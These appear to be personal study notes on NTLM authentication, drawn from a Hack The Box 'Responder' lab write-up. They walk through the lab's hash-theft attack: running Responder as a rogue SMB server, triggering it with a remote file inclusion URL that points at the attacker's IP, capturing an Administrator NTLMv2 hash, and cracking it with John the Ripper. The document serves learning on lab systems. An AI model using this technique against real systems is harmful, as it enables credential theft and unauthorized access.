# NTLM
NTLM is a collection of authentication protocols created by Microsoft. It is a challenge-response 
authentication protocol used to authenticate a client to a resource on an Active Directory domain.
It is a type of single sign-on (SSO) because it allows the user to provide the underlying authentication factor 
only once, at login.
The NTLM authentication process is done in the following way:
 1. The client sends the user name and domain name to the server.
 2. The server generates a random character string, referred to as the challenge.
 3. The client encrypts the challenge with the NTLM hash of the user password and sends it back to the 
server.
 4. The server retrieves the user password (or equivalent).
 5. The server uses the hash value retrieved from the security account database to encrypt the challenge 
    string. The value is then compared to the value received from the client. If the values match, the client 
    is authenticated. [^1]

## Key Terms
- **Hash Function**: one-way function that takes any amount of data and returns a fixed size value.
- **Hash** (aka digest or fingerprint): output of a hash function
- **NTHash**: output of the NTLM alorithm used to store passwords on Windows systems in the SAM database and on domain controllers.
- **NTLM Protocol**: uses a challenge / response model for authentication over the network.
- **NetNTLMv2 challenge / response**: A string specifically formatted to include the challenge and response. This is often referred to as a NetNTLMv2 hash, but it's not actually 
a hash. [^1]

## Responder 
### Stealing NTLM Hashes
#### PHP Overview
In the PHP configuration file php.ini, "allow_url_include" wrapper is set to "Off" by default, indicating that 
PHP does not load remote HTTP or FTP URLs to prevent remote file inclusion attacks. However, even if 
allow_url_include and allow_url_fopen are set to "Off", PHP will not prevent the loading of SMB URLs. 
In our case, we can misuse this functionality to steal the NTLM hash
#### Malicious SMB Server
Responder can do many different kinds of attacks, but for this scenario, it will set up a malicious SMB server. 

1. When the target machine attempts to perform the NTLM authentication to that server and Responder sends a 
challenge back for the server to encrypt with the user's password.
2. When the server responds, Responder will use the challenge and the encrypted response to generate the NetNTLMv2.
3. While we can't reverse the NetNTLMv2, we can try many different common passwords to see if any generate the same challenge
response, and if we find one, we know that is the password. This is often referred to as hash cracking, which 
we'll do with a program called John The Ripper. [^1]

**Tell Responder to Listenr on Tun0 Interface**
```bash
sudo responder -I tun0
```
**Ex. Remote File Inclusion URL**
```url
http://unika.htb/?page=//10.10.14.25/FILE
```
**Ex. Response Capture by Responder**
```Responder
[SMB] NTLMv2-SSP Client   : 10.129.151.150
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:9bf5092ee94b31d5:B4982CEF0A4658C702ACE97B34964E57:01010000000000000010F3120409DB01A4FE1D95270FC3400000000002000800580033004600390001001E00570049004E002D0058004B0047004D0047005600430053004E003300390004003400570049004E002D0058004B0047004D0047005600430053004E00330039002E0058003300460039002E004C004F00430041004C000300140058003300460039002E004C004F00430041004C000500140058003300460039002E004C004F00430041004C00070008000010F3120409DB0106000400020000000800300030000000000000000100000000200000788474386B885A83498A85356594AF9BF0FD3BD4209F3525FAAE8844AEDC57A70A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003200340036000000000000000000
```
**Save NTLMv2-SSP Hash**
```bash
echo '<NTLMv2-SSP HASH>' > hash
```
**Crack with John**
```bash
john -w=/usr/share/wordlists/rockyou.txt hash
```


[^1]: dotguy. “Responder Write-Up.” Https://App.Hackthebox.Com/, Hack The Box, blob:app.hackthebox.com/b4dac986-90c4-43b6-a8ce-5226acc68a05. Accessed 17 Sept. 2024. 
